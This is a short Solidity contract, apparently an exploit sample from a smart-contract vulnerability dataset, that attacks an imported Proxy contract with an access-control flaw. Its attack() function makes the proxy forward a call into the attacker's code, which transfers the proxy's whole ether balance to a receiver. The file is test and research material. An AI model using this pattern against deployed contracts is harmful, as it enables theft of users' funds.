pragma solidity ^0.4.24;

import "../dataset/access_control/proxy.sol";

contract ProxyAttacker {
    Proxy public target;

    constructor(Proxy _target) public {
        target = _target;
    }

    function attack() public {
        target.forward(
            address(this),
            abi.encodeWithSignature("call(address)", address(this))
        );
    }

    function call(address receiver) public {
        receiver.transfer(address(this).balance);
    }

    function benign() public {}

    function() public payable {}
}
